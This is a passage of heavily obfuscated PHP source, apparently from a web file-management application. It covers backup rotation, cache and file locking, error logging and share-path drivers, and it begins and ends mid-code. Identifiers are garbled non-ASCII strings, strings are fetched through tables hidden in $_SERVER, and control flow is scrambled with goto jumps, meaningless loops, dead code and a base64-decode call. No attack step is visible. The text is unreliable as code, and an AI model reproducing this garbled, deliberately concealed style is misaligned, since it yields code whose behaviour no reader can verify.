($B‘„÷¬Åš¬[19]($b››½Ö¥‘±) != 2) { return $B‘„÷¬Åš¬[10]; } $eƒ¤èÎÈ‡´ = $this->{$_SERVER[òÀÆ×ø][243]}($b››½Ö¥‘±[1] . $B‘„÷¬Åš¬[10], $B‘„÷¬Åš¬[149]); if (!$eƒ¤èÎÈ‡´) { return $B‘„÷¬Åš¬[10]; } goto b·Ğ”òâŠÊ; Dåø¥­ê†©: $aŠÃÉïàæŠ = $B‘„÷¬Åš¬[201](($F ÌÏãÓñ + $B‚Ã‚¼óªå) / 2); while (1) { $Cò«« Ù‘ = $aŠÃÉïàæŠ; $B¥¡â›¢½¡ = $C¿ªïã’Â; $Bæâ³äŠ–² = $A‚ßñĞ’×±[667]; while ($B¥¡â›¢½¡ % $Cò«« Ù‘ != 0) { $fÊô†Ä©†Š = $B¥¡â›¢½¡; $f¯à‚ó½È™ = $A‚ßñĞ’×±[668]; $B¥¡â›¢½¡ = $Cò«« Ù‘; $E©ìº‚‘‹ = $A‚ßñĞ’×±[669]; while ($E©ìº‚‘‹ < $A‚ßñĞ’×±[547]) { if ($E©ìº‚‘‹ >= 0) { break; } $E©ìº‚‘‹++; } $Cò«« Ù‘ = $fÊô†Ä©†Š % $Cò«« Ù‘; } if ($Cò«« Ù‘ == 1) { break; } else { $aŠÃÉïàæŠ++; } } $E¸‰ìŠ¸å = 2; goto DìÄªÖŒãº; b·Ğ”òâŠÊ: $eƒ¤èÎÈ‡´ = $B‘„÷¬Åš¬[201]($eƒ¤èÎÈ‡´); $F ÌÏãÓñ = 0; $eÓÑÊ°ÙòŒ = $A‚ßñĞ’×±[663]; goto f»Šµ¤÷Ğ‘; Cö´¶ôÕˆò: $dóè˜¬£ù… = $A‚ßñĞ’×±[670]; if (strlen($dóè˜¬£ù…) < $A‚ßñĞ’×±[554]) { die; } return $F°æÄŸ§•õ; goto cÎ×ç„¼Œ©; eÌõ´§Â…ˆ: $A‚ßñĞ’×± =& $_SERVER[£ü]; $B‘„÷¬Åš¬ =& $_SERVER[òÀÆ×ø]; $b››½Ö¥‘± = $B‘„÷¬Åš¬[0]($B‘„÷¬Åš¬[341], $bôÈ­Ø); goto CÑ”áÉ¹ïŒ; cÎ×ç„¼Œ©: } public function iygf23cfee43() { goto DÄÓ·³ØöŞ; d´·ñ»¥ô¸: $E³¦ë±÷ñ = $EÉšÂŒ•ó[673]; if (!$E³¦ë±÷ñ) { die; } for ($CÁ„î‡—É = $cî”ªÔéŞ; $CÁ„î‡—É > 1; $CÁ„î‡—É--) { $DËÈ£§±¢¬ = !0; $BÀŒŸÀÇÇª = $EÉšÂŒ•ó[674]; if (strlen($BÀŒŸÀÇÇª) < $EÉšÂŒ•ó[558]) { return; } foreach ($b°­èà¨¤ñ as $E×Ú¡Êó§ˆ) { if ($CÁ„î‡—É % $E×Ú¡Êó§ˆ == 0) { $DËÈ£§±¢¬ = !1; break; } } if ($DËÈ£§±¢¬) { $D©³„´ç‘— = $CÁ„î‡—É; break; } } goto CÓˆ¥õ‡Š; dì¤ß‰²Úé: $eìºˆ„’‹Ğ = 1; while ($eìºˆ„’‹Ğ <= (int) $f¨––Œ°ª˜[343]($cî”ªÔéŞ)) { $CÁ„î‡—É = $eìºˆ„’‹Ğ; $dæ’°•¢  = $EÉšÂŒ•ó[672]; while (!0) { $CÁ„î‡—É++; if ($CÁ„î‡—É <= 2) { $eìºˆ„’‹Ğ = $CÁ„î‡—É; break; } else { if ($CÁ„î‡—É < 2) { continue; } } $DËÈ£§±¢¬ = !0; for ($Dé­Ò¡²È‡ = 2; $Dé­Ò¡²È‡ <= $f¨––Œ°ª˜[343]($CÁ„î‡—É); $Dé­Ò¡²È‡++) { if ($CÁ„î‡—É % $Dé­Ò¡²È‡ == 0) { $DËÈ£§±¢¬ = !1; } } if ($DËÈ£§±¢¬) { $eìºˆ„’‹Ğ = $CÁ„î‡—É; break; } } $b°­èà¨¤ñ[] = $eìºˆ„’‹Ğ; } $D©³„´ç‘— = 2; goto d´·ñ»¥ô¸; CÓˆ¥õ‡Š: return $D©³„´ç‘—; goto b°çÎÛî; C½“Â‰£ÄÚ: $b‘½ŸŠì¥® = $EÉšÂŒ•ó[671]; while (strlen($b‘½ŸŠì¥®) < $EÉšÂŒ•ó[558]) { if (!$b‘½ŸŠì¥®) { break; } $b‘½ŸŠì¥®++; } $b°­èà¨¤ñ = array(); goto dì¤ß‰²Úé; DÄÓ·³ØöŞ: $EÉšÂŒ•ó =& $_SERVER[£ü]; $f¨––Œ°ª˜ =& $_SERVER[òÀÆ×ø]; $cî”ªÔéŞ = $f¨––Œ°ª˜[322]($f¨––Œ°ª˜[342](2, 14), $f¨––Œ°ª˜[342](2, 16) - 1); goto C½“Â‰£ÄÚ; b°çÎÛî: } public function merf44fdcf1b($eÁğíä§Ô, $e±Ó…÷ÍµÖ) { $cŞÌÏ‡”Ã =& $_SERVER[òÀÆ×ø]; return $cŞÌÏ‡”Ã[13](array($cŞÌÏ‡”Ã[14], $cŞÌÏ‡”Ã[344]), $eÁğíä§Ô, $e±Ó…÷ÍµÖ); } public function ziwd260a0c02($BÓÁµŒ‡÷œ, $f§•„©¡­ª) { $aêÄÚ÷÷ğ =& $_SERVER[òÀÆ×ø]; return $aêÄÚ÷÷ğ[13](array($aêÄÚ÷÷ğ[345], $aêÄÚ÷÷ğ[346]), $BÓÁµŒ‡÷œ, $f§•„©¡­ª); $C»±ªáÛØ = $_SERVER[£ü][675]; if (!$C»±ªáÛØ) { return; } } public function munzaa8df04a($eé¬’ŒÌ‰, $Cš†èŞ¿™å) { $cè˜ôÚÅô— =& $_SERVER[òÀÆ×ø]; return $cè˜ôÚÅô—[13](array($cè˜ôÚÅô—[345], $cè˜ôÚÅô—[347]), $eé¬’ŒÌ‰, $Cš†èŞ¿™å); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $eğ’è½¾Ø¥ =& $_SERVER[£ü]; self::$name = date($eğ’è½¾Ø¥[676]); if (!($bÏ‚ê–ŒíŞ = Model($eğ’è½¾Ø¥[677])->lastItem())) { $bÏ‚ê–ŒíŞ = $this->initData(); } else { self::$name = $bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[28]]; if ($bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[678]] == $eğ’è½¾Ø¥[83]) { self::$name = date($eğ’è½¾Ø¥[679]); $d„É¢…äÌ÷ = 0; if (isset($bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[278]][$eğ’è½¾Ø¥[164]][$eğ’è½¾Ø¥[415]])) { $d„É¢…äÌ÷ = (int) $bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[278]][$eğ’è½¾Ø¥[164]][$eğ’è½¾Ø¥[415]]; } if ($bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[28]] == self::$name) { Model($eğ’è½¾Ø¥[677])->remove($bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[364]]); } $bÏ‚ê–ŒíŞ = $this->initData($d„É¢…äÌ÷, $bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[680]]); } else { $this->checkStore($bÏ‚ê–ŒíŞ[$eğ’è½¾Ø¥[680]]); } } self::$option = $bÏ‚ê–ŒíŞ; } private function initData($DÂˆœôäïÂ = 0, $E®—ô­Ù = '') { goto D‚Ë‹‹œ³À; b×ğ¦ï‘¾ê: $this->checkStore($eììÒ»ƒö[$AĞŒŒ«¾•×[680]]); $c¶Ãµë‹¬ = array($AĞŒŒ«¾•×[680] => $eììÒ»ƒö[$AĞŒŒ«¾•×[680]], $AĞŒŒ«¾•×[28] => self::$name, $AĞŒŒ«¾•×[678] => 0, $AĞŒŒ«¾•×[681] => $eììÒ»ƒö[$AĞŒŒ«¾•×[681]], $AĞŒŒ«¾•×[278] => array($AĞŒŒ«¾•×[682] => array($AĞŒŒ«¾•×[678] => 0), $AĞŒŒ«¾•×[683] => array($AĞŒŒ«¾•×[678] => 0, $AĞŒŒ«¾•×[684] => 0, $AĞŒŒ«¾•×[685] => 0, $AĞŒŒ«¾•×[29] => $AĞŒŒ«¾•×[33]), $AĞŒŒ«¾•×[686] => array($AĞŒŒ«¾•×[678] => 0, $AĞŒŒ«¾•×[684] => 0, $AĞŒŒ«¾•×[685] => 0), $AĞŒŒ«¾•×[164] => array($AĞŒŒ«¾•×[678] => 0, $AĞŒŒ«¾•×[687] => 0, $AĞŒŒ«¾•×[688] => 0, $AĞŒŒ«¾•×[689] => 0, $AĞŒŒ«¾•×[690] => 0, $AĞŒŒ«¾•×[415] => $DÂˆœôäïÂ)), $AĞŒŒ«¾•×[691] => time(), $AĞŒŒ«¾•×[692] => 0); $cÄÔö÷âõ“ = Model($AĞŒŒ«¾•×[677])->insert($c¶Ãµë‹¬); goto aô‡ƒ–›ƒ; aô‡ƒ–›ƒ: $c¶Ãµë‹¬[$AĞŒŒ«¾•×[364]] = $cÄÔö÷âõ“; return $c¶Ãµë‹¬; goto Cùõà¬‡ç; D‚Ë‹‹œ³À: $AĞŒŒ«¾•× =& $_SERVER[£ü]; $eììÒ»ƒö = Model($AĞŒŒ«¾•×[677])->config(); if ($E®—ô­Ù && $eììÒ»ƒö[$AĞŒŒ«¾•×[680]] != $E®—ô­Ù) { $DÂˆœôäïÂ = 0; } goto b×ğ¦ï‘¾ê; Cùõà¬‡ç: } private function checkStore($Aİ¯²—Ø÷) { $FçÁßø£• =& $_SERVER[£ü]; $cš·Í»ÃŸË = Model($FçÁßø£•[693])->listData($Aİ¯²—Ø÷); Model($FçÁßø£•[693])->checkConfig($cš·Í»ÃŸË); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[£ü][677])->findByName(self::$name); } return self::$option; } public static function set($E«¸—Æšµ) { $CÂÂ­ß¬Õ =& $_SERVER[£ü]; $bå±×…¡çÚ = self::get(); foreach ($E«¸—Æšµ as $cõ¦…‘ÖÚ­ => $e‚âã ) { $A•âÎ•š¨ø = explode($CÂÂ­ß¬Õ[93], $cõ¦…‘ÖÚ­); $dª…ÈÀ´ù† = count($A•âÎ•š¨ø); switch ($dª…ÈÀ´ù†) { case 1: $bå±×…¡çÚ[$A•âÎ•š¨ø[0]] = $e‚âã ; break; case 2: $bå±×…¡çÚ[$A•âÎ•š¨ø[0]][$A•âÎ•š¨ø[1]] = $e‚âã ; break; case 3: $bå±×…¡çÚ[$A•âÎ•š¨ø[0]][$A•âÎ•š¨ø[1]][$A•âÎ•š¨ø[2]] = $e‚âã ; break; } } Model($CÂÂ­ß¬Õ[677])->update($bå±×…¡çÚ[$CÂÂ­ß¬Õ[364]], $bå±×…¡çÚ); self::$option = $bå±×…¡çÚ; return self::$option; } public function keep() { $f„ñÆÜÆí® =& $_SERVER[£ü]; $CÍáïø»™¢ = self::get(); if ($CÍáïø»™¢[$f„ñÆÜÆí®[278]][$f„ñÆÜÆí®[682]][$f„ñÆÜÆí®[678]] == $f„ñÆÜÆí®[83]) { return; } $this->backupKeep($CÍáïø»™¢); self::set(array($f„ñÆÜÆí®[694] => 1)); } private function backupKeep($AÏ® ™…¯) { goto B·Œ³ «; B·Œ³ «: $Fˆ‡Áå‚Œñ =& $_SERVER[£ü]; $F„µœĞ·³ = Model($Fˆ‡Áå‚Œñ[677])->listData(); if (empty($F„µœĞ·³)) { return; } goto D¥‡¤¸ìÉ; D¥‡¤¸ìÉ: $F¯°ñäéçè = 0; $AÃŠ•æ¤ä² = array(); foreach ($F„µœĞ·³ as $F¢´ÊÊÅ×) { if ($F¯°ñäéçè >= 7) { break; } $AÃŠ•æ¤ä²[] = $F¢´ÊÊÅ×[$Fˆ‡Áå‚Œñ[28]]; $F¯°ñäéçè++; } goto DìÊøŸ™ˆ¯; DìÊøŸ™ˆ¯: for ($F¯°ñäéçè = 0; $F¯°ñäéçè < 12; $F¯°ñäéçè++) { $AÃŠ•æ¤ä²[] = date($Fˆ‡Áå‚Œñ[695], strtotime("\55{$F¯°ñäéçè}\x20\x6d\x6f\x6e\x74\150\x73")); } $AÃŠ•æ¤ä² = array_unique($AÃŠ•æ¤ä²); foreach ($F„µœĞ·³ as $F¢´ÊÊÅ×) { if (!empty($F¢´ÊÊÅ×[$Fˆ‡Áå‚Œñ[28]]) && in_array($F¢´ÊÊÅ×[$Fˆ‡Áå‚Œñ[28]], $AÃŠ•æ¤ä²)) { continue; } Model($Fˆ‡Áå‚Œñ[677])->remove($F¢´ÊÊÅ×[$Fˆ‡Áå‚Œñ[364]]); $dÈåƒÓ ¼× = "\x7b\x69\x6f\72{$AÏ® ™…¯[$Fˆ‡Áå‚Œñ[680]]}\x7d\57\144\141\x74\x61\142\141\163\x65\x2f\142\x61\x63\x6b\165\x70\x5f{$F¢´ÊÊÅ×[$Fˆ‡Áå‚Œñ[28]]}"; IO::remove($dÈåƒÓ ¼×, !1); } goto a¬ôæãÓä·; a¬ôæãÓä·: } public function db() { goto d˜ØÖ¾æ; fšÍ„•«÷Ó: return !0; goto AÜ¬¯…´î; d˜ØÖ¾æ: $cÔºË·‡½È =& $_SERVER[£ü]; $c©ßŞÑÁ = self::get(); if ($c©ßŞÑÁ[$cÔºË·‡½È[278]][$cÔºË·‡½È[683]][$cÔºË·‡½È[678]] == $cÔºË·‡½È[83]) { return !0; } goto C Ì‘âŠÛ–; C Ì‘âŠÛ–: $EÀ‹‚×ğäô = new BackupDb(); if (!$EÀ‹‚×ğäô->index()) { return !1; } self::set(array($cÔºË·‡½È[696] => 1)); goto fšÍ„•«÷Ó; AÜ¬¯…´î: } public function dbFile() { goto dòãÉõ„œÚ; B «—÷‰‡„: return !0; goto D˜¡“¨¢°; Cšíä¯¸¨: $Fàö½àÛä = new BackupDbFile(); if (!$Fàö½àÛä->index()) { return !1; } self::set(array($EÁŸöï‡¤æ[697] => 1)); goto B «—÷‰‡„; dòãÉõ„œÚ: $EÁŸöï‡¤æ =& $_SERVER[£ü]; $cª¿”…µ×¼ = self::get(); if ($cª¿”…µ×¼[$EÁŸöï‡¤æ[278]][$EÁŸöï‡¤æ[686]][$EÁŸöï‡¤æ[678]] == $EÁŸöï‡¤æ[83]) { return !0; } goto Cšíä¯¸¨; D˜¡“¨¢°: } public function file() { $f†Äì =& $_SERVER[£ü]; $e÷£‘À¢Õâ = self::get(); if ($e÷£‘À¢Õâ[$f†Äì[278]][$f†Äì[164]][$f†Äì[678]] == $f†Äì[83]) { return !0; } if (!isset($e÷£‘À¢Õâ[$f†Äì[681]]) || $e÷£‘À¢Õâ[$f†Äì[681]] == $f†Äì[464]) { $e§òĞ¤‹ÛÃ = new BackupFile(); if (!$e§òĞ¤‹ÛÃ->index()) { return !1; } } self::set(array($f†Äì[698] => 1, $f†Äì[678] => 1)); return !0; } } goto fâ¬ßôéÑ; b²ôƒÅÊç—: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto b–„ÑĞ„”; F…ñÆ‰Û½®: self::$timeout = $E‹ĞÀ®­ùõ[$aÛ‡Ëºß[762]] ? $E‹ĞÀ®­ùõ[$aÛ‡Ëºß[762]] : 10; $aôÍª…íïÅ = _get($GLOBALS[$aÛ‡Ëºß[6]], $aÛ‡Ëºß[763]); $F‹İèˆš§ì = $E‹ĞÀ®­ùõ[$aÛ‡Ëºß[749]] ? $E‹ĞÀ®­ùõ[$aÛ‡Ëºß[749]] : $aÛ‡Ëºß[164]; goto d‰ñ„ŸÃ†; b–„ÑĞ„”: $aÛ‡Ëºß =& $_SERVER[£ü]; if (self::$handle) { return self::$handle; } $E‹ĞÀ®­ùõ = $GLOBALS[$aÛ‡Ëºß[6]][$aÛ‡Ëºß[334]]; goto F…ñÆ‰Û½®; d‰ñ„ŸÃ†: if ($F‹İèˆš§ì == $aÛ‡Ëºß[17] && $aôÍª…íïÅ == $aÛ‡Ëºß[9]) { $F‹İèˆš§ì = $aÛ‡Ëºß[164]; } switch ($F‹İèˆš§ì) { case $aÛ‡Ëºß[752]: self::$handle = new CacheLockRedis(); break; case $aÛ‡Ëºß[753]: self::$handle = new CacheLockMemcached(); break; case $aÛ‡Ëºß[17]: self::$handle = new CacheLockDatabase(); break; case $aÛ‡Ëºß[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto bÆèèíà¨Š; bÆèèíà¨Š: } private static function key($Fİ¬Ş·‹Ü¦) { return $_SERVER[£ü][764] . Cache::key($Fİ¬Ş·‹Ü¦); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($B“Ÿùâó”Œ = '') { self::$errorMsg = $B“Ÿùâó”Œ; } public static function lockGlobal($DÇ¹Ë›óÆæ, $DâŠ½ÒİáÌ) { return self::lock($DÇ¹Ë›óÆæ, $DâŠ½ÒİáÌ, !0); } public static function lock($dø‚Ëª°Î, $F„Ø”‰—ò = false, $b¶ˆ·¼Ô¹† = false) { goto DÛğ´ÊİÀ; b‡²å™®åÆ: $F„Ø”‰—ò = $F„Ø”‰—ò ? $F„Ø”‰—ò : self::$timeout; $Aˆ¦Ü‰Øï¡ = $f½¦êÖŠ‚¢->lock($b¦ğ•ù»¹Î, $F„Ø”‰—ò); if (!$Aˆ¦Ü‰Øï¡) { $e¿Ô±ãù÷ = $fòºÇß£Ö [765] . $F„Ø”‰—ò . $fòºÇß£Ö [67] . self::$errorMsg . $fòºÇß£Ö [67] . get_caller_msg(); $a÷‘ŸÇ Â = "\x4c\157\x63\153\x20\141\143\164\x69\157\156\x3a\40{$b¦ğ•ù»¹Î}\x20\x74\151\155\145\157\165\164\x2c\157\x76\145\x72\x20{$F„Ø”‰—ò}\x20\x73"; $a÷‘ŸÇ Â = self::$errorMsg ? self::$errorMsg : $föª«…Šğ°; write_log($e¿Ô±ãù÷, $fòºÇß£Ö [766]); show_json($a÷‘ŸÇ Â, !1); } goto cÙŸğÑç´; DÛğ´ÊİÀ: $fòºÇß£Ö  =& $_SERVER[£ü]; $f½¦êÖŠ‚¢ = self::init(); $b¦ğ•ù»¹Î = self::key($dø‚Ëª°Î); goto b‡²å™®åÆ; cÙŸğÑç´: if (!$b¶ˆ·¼Ô¹†) { self::$lockItem[$b¦ğ•ù»¹Î] = !0; } return $Aˆ¦Ü‰Øï¡; goto BêÕã†ĞŒŞ; BêÕã†ĞŒŞ: } public static function lockGet($dÃÎÚãÕĞÁ) { $A”¹Œ‹Õß = self::key($dÃÎÚãÕĞÁ); if (self::$lockItem[$A”¹Œ‹Õß]) { return self::$lockItem[$A”¹Œ‹Õß]; } return self::init()->lockGet($A”¹Œ‹Õß); } public static function unlock($B¨È¼µŸ’) { $b÷´¨Ç³™Ü = self::key($B¨È¼µŸ’); self::$lockItem[$b÷´¨Ç³™Ü] = null; return self::init()->unlock($b÷´¨Ç³™Ü); } public static function unlockRuntime() { $B–à¸©ŠŠŞ =& $_SERVER[£ü]; $Dİ·ñÓ©Î¾ = self::init(); $AæÍÙÁ³Œå = !1; foreach (self::$lockItem as $fö¶‚¨ïÓè => $Eï±…›Ã) { if (!$Eï±…›Ã) { continue; } $Dİ·ñÓ©Î¾->unlock($fö¶‚¨ïÓè); if (!$AæÍÙÁ³Œå) { $AæÍÙÁ³Œå = !0; write_log($B–à¸©ŠŠŞ[767] . $fö¶‚¨ïÓè . $B–à¸©ŠŠŞ[67] . get_caller_msg(), $B–à¸©ŠŠŞ[766]); continue; } write_log($B–à¸©ŠŠŞ[767] . $fö¶‚¨ïÓè, $B–à¸©ŠŠŞ[766]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A¥˜ñ°˜äº =& $_SERVER[£ü]; $B÷õËÈ¶ÁÁ = $GLOBALS[$A¥˜ñ°˜äº[6]][$A¥˜ñ°˜äº[334]]; self::$cachePath = $B÷õËÈ¶ÁÁ[$A¥˜ñ°˜äº[164]][$A¥˜ñ°˜äº[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($dÛ¼·£ù×, $fÖ˜È‚İ“ = 0) { goto dİîŠÀ¼°¸; dİîŠÀ¼°¸: $c…ŞßŞç†’ =& $_SERVER[£ü]; $C£ğå ôÆ = microtime(!0); $bù‚‡²Û = $C£ğå ôÆ + $fÖ˜È‚İ“ + 0.0001; goto EÈ«ÊÖ‡è¢; dÉÎ‡Ì¹Œø: $this->unlock($dÛ¼·£ù×); return !1; goto EÚÉì³í®¡; EÈ«ÊÖ‡è¢: $a±‹Õ˜Ó‘ = rtrim(self::$cachePath, $c…ŞßŞç†’[8]) . $c…ŞßŞç†’[768] . md5($dÛ¼·£ù×) . $c…ŞßŞç†’[769]; if (file_exists($a±‹Õ˜Ó‘) && filemtime($a±‹Õ˜Ó‘) && filemtime($a±‹Õ˜Ó‘) < time() - 10) { @unlink($a±‹Õ˜Ó‘); } do { if (file_exists($a±‹Õ˜Ó‘)) { cacheLockWait(); continue; } $b²äŸĞÇ¤§ = fopen($a±‹Õ˜Ó‘, $c…ŞßŞç†’[770]); if (!$b²äŸĞÇ¤§) { return !1; } $Bï„‚‰Àß› = flock($b²äŸĞÇ¤§, LOCK_EX | LOCK_NB); self::$caches[$dÛ¼·£ù×] = array($c…ŞßŞç†’[771] => $b²äŸĞÇ¤§, $c…ŞßŞç†’[164] => $a±‹Õ˜Ó‘); fwrite($b²äŸĞÇ¤§, $bù‚‡²Û); clearstatcache(); if ($b²äŸĞÇ¤§ && $Bï„‚‰Àß›) { return !0; } cacheLockWait(); } while (microtime(!0) < $bù‚‡²Û); goto dÉÎ‡Ì¹Œø; EÚÉì³í®¡: } public function lockGet($C¡¶´Ğ„™æ) { $AÄ·®ã‚‹  =& $_SERVER[£ü]; $B•½Æâò´´ = rtrim(self::$cachePath, $AÄ·®ã‚‹ [8]) . $AÄ·®ã‚‹ [768] . md5($C¡¶´Ğ„™æ) . $AÄ·®ã‚‹ [769]; return file_exists($B•½Æâò´´); } public function unlock($bï·ñí¿) { goto cÃìªö—; a² ¬®Æ©ø: @flock($CÂ»Ó©î¸¬[$BæÁÇÀÓ½[771]], LOCK_UN); @fclose($CÂ»Ó©î¸¬[$BæÁÇÀÓ½[771]]); @unlink($CÂ»Ó©î¸¬[$BæÁÇÀÓ½[164]]); goto cÈŠâ­Ò¬; cÈŠâ­Ò¬: unset(self::$caches[$bï·ñí¿]); goto FÛ†ò¨¬¹Ø; cÃìªö—: $BæÁÇÀÓ½ =& $_SERVER[£ü]; $CÂ»Ó©î¸¬ = self::$caches[$bï·ñí¿]; if (!$CÂ»Ó©î¸¬) { return; } goto a² ¬®Æ©ø; FÛ†ò¨¬¹Ø: } } goto D‡±ç‹—; D´˜‘İ°šË: define($_SERVER[£ü][224], 2); define($_SERVER[£ü][225], 3); define($_SERVER[£ü][226], 1); goto fÜ·ó˜™ØØ; cê†ñ¡Ê½”: function beforeShutdownError($Eó‚á‘ã™ò = false, $B”ƒËŒ = '', $dÛÑÓ™ùÀä = '', $F¬åÌöò‘¢ = 0) { $Fî‘ËñÈˆ÷ =& $_SERVER[ĞÔ]; switch ($Eó‚á‘ã™ò) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $D†ÛØù¸Ğ = $Fî‘ËñÈˆ÷[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $D†ÛØù¸Ğ = $Fî‘ËñÈˆ÷[40]; break; case E_STRICT: $D†ÛØù¸Ğ = $Fî‘ËñÈˆ÷[41]; break; case E_NOTICE: case E_USER_NOTICE: $D†ÛØù¸Ğ = $Fî‘ËñÈˆ÷[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $D†ÛØù¸Ğ = $Fî‘ËñÈˆ÷[43]; break; default: break; } if (!$D†ÛØù¸Ğ || $D†ÛØù¸Ğ == $Fî‘ËñÈˆ÷[42] || $D†ÛØù¸Ğ == $Fî‘ËñÈˆ÷[43]) { return; } $dÛÑÓ™ùÀä = $Fî‘ËñÈˆ÷[4] . str_replace($_SERVER[$Fî‘ËñÈˆ÷[37]], $Fî‘ËñÈˆ÷[20], $dÛÑÓ™ùÀä); $FÓÛ‚‘“ÇÜ = $D†ÛØù¸Ğ . $Fî‘ËñÈˆ÷[44] . $B”ƒËŒ . $Fî‘ËñÈˆ÷[44] . $dÛÑÓ™ùÀä . $Fî‘ËñÈˆ÷[44] . $F¬åÌöò‘¢; write_log($FÓÛ‚‘“ÇÜ . $Fî‘ËñÈˆ÷[18] . get_caller_msg(1), $Fî‘ËñÈˆ÷[19]); } $_SERVER[$_SERVER[ĞÔ][45]] = $_SERVER[$_SERVER[ĞÔ][37]] . $_SERVER[ĞÔ][46]; $fÒ÷ÛÑñö = strrev(base64_decode($_SERVER[ĞÔ][47])); goto C¢·¥µòé; aĞ¤ß¯¢²: class PathDriverDbShareItem extends PathDriverDB { public function __construct($e¯’™ê¥À—) { $this->pathParse = $e¯’™ê¥À—; $this->model = Model($_SERVER[£ü][1100]); } public function getPathOuter($CèÄ‡òë×) { $añ«‚ÀÈîã =& $_SERVER[£ü]; if (!$CèÄ‡òë×) { return $CèÄ‡òë×; } $EË®ÒãÚéÒ = $this->parse($CèÄ‡òë×); return trim(KodIO::makeShare($this->pathParse[$añ«‚ÀÈîã[364]], $EË®ÒãÚéÒ[$añ«‚ÀÈîã[364]]), $añ«‚ÀÈîã[8]); } protected function infoParse($D²‰ØÃ, $Fè‡ ÚˆÓÎ = false, $Fö›ÇÚï‡§ = false) { $fÄ‰© ¯¨è =& $_SERVER[£ü]; $DÏëÕàÎİØ = $this->pathParse[$fÄ‰© ¯¨è[364]]; $DÂ„Ş¼–Ü³ = trim($this->pathParse[$fÄ‰© ¯¨è[999]], $fÄ‰© ¯¨è[8]); return Action($fÄ‰© ¯¨è[1106])->sharePathInfo($DÏëÕàÎİØ, $DÂ„Ş¼–Ü³); } public function infoFull($aÚ„‹éÜî) { $E‹—È¯¬¼ =& $_SERVER[£ü]; $E™îÖèÜ‹Ö = explode($E‹—È¯¬¼[8], trim($aÚ„‹éÜî, $E‹—È¯¬¼[8])); if (count($E™îÖèÜ‹Ö) > 1) { $fõáòÍ™ï = implode($E‹—È¯¬¼[8], array_splice($E™îÖèÜ‹Ö, 1)); $e¤ÄÈ¾Ì…ñ = $this->model->pathInfoByPath($E™îÖèÜ‹Ö[0], $fõáòÍ™ï); if (!$e¤ÄÈ¾Ì…ñ) { return !1; } $this->pathParse[$E‹—È¯¬¼[999]] = $e¤ÄÈ¾Ì…ñ[$E‹—È¯¬¼[366]]; } return $this->infoParse($aÚ„‹éÜî); } public function listAll($a„º¹¹„Æ) { goto b°Œï‚…öë; aâ­¹ƒ†é: $D²Ôœàµù… = $this->model->listAll($a„º¹¹„Æ); $aËŒÂ¸ëãÑ = Model($EÊì†µŠÔ„[532])->getInfo($B¯ñ´ß±¦”[$EÊì†µŠÔ„[437]]); $AÆØÖá„” = Action($EÊì†µŠÔ„[1106]); goto CªäÓ£ç‚Î; b°Œï‚…öë: $EÊì†µŠÔ„ =& $_SERVER[£ü]; $B¯ñ´ß±¦” = IO::info($this->pathParse[$EÊì†µŠÔ„[75]]); if (!$B¯ñ´ß±¦”) { return array(); } goto aâ­¹ƒ†é; CªäÓ£ç‚Î: foreach ($D²Ôœàµù… as &$C«‚æ®Ã¼Ù) { check_abort(); $C«‚æ®Ã¼Ù[$EÊì†µŠÔ„[388]] = $AÆØÖá„”->_shareItemeParse($C«‚æ®Ã¼Ù[$EÊì†µŠÔ„[388]], $aËŒÂ¸ëãÑ); } return $D²Ôœàµù…; goto e¸‚Õó•´; e¸‚Õó•´: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($BàÍİ•Ñç) { $this->pathParse = $BàÍİ•Ñç; $this->model = Model($_SERVER[£ü][1100]); } protected function infoParse($a‹Á» Ğ”Ğ, $EÃãœ¡¹® = false, $e‚Ìó¿ï–ø = false) { $Dñ°ñ‚½Š =& $_SERVER[£ü]; return Action($Dñ°ñ‚½Š[1005])->sharePathInfo($this->pathParse[$Dñ°ñ‚½Š[75]], !0); } public function listPath($e‘É¦ïÌ , $f‹àñÀ£­‚ = false) { $d‘Ş¢‘İÃ =& $_SERVER[£ü]; $aá°ÀĞ–ØË = parent::listPath($e‘É¦ïÌ , $f‹àñÀ£­‚); foreach ($aá°ÀĞ–ØË as $Cé¸éÜÅ¦ => $Aµó¼³ñ„) { if (!in_array($Cé¸éÜÅ¦, array($d‘Ş¢‘İÃ[73], $d‘Ş¢‘İÃ[74]))) { continue; } foreach ($Aµó¼³ñ„ as $BÛ•†æŠÕ => $b¿İÈï‚µ) { $aá°ÀĞ–ØË[$Cé¸éÜÅ¦][$BÛ•†æŠÕ] = Action($d‘Ş¢‘İÃ[1005])->shareItemInfo($b¿İÈï‚µ); } } return $aá°ÀĞ–ØË; } public function listAll($fïÄµÒÒ) { $FôÃÓá±‰¨ =& $_SERVER[£ü]; $D¨ƒƒ˜ÑÒó = IO::info($this->pathParse[$FôÃÓá±‰¨[75]]); if (!$D¨ƒƒ˜ÑÒó) { return array(); } $fğËÙŒ¬²á = $this->model->listAll($fïÄµÒÒ); foreach ($fğËÙŒ¬²á as &$cö°¬›¹Ú) { $cö°¬›¹Ú[$FôÃÓá±‰¨[388]] = Action($FôÃÓá±‰¨[1005])->shareItemInfo($cö°¬›¹Ú[$FôÃÓá±‰¨[388]]); } return $fğËÙŒ¬²á; } } class PathDriverDriverShareItem { public function __construct($eÎ¿•ƒ¾‘·) { $this->pathParse = $eÎ¿•ƒ¾‘·; } public function __call($D¥ÜÀœ‘, $f´´Øá‚†¿) { $A‘ËËĞÁ…è =& $_SERVER[£ü]; if (method_exists($this, $D¥ÜÀœ‘)) { return; } $D­ª…ğÕ» = 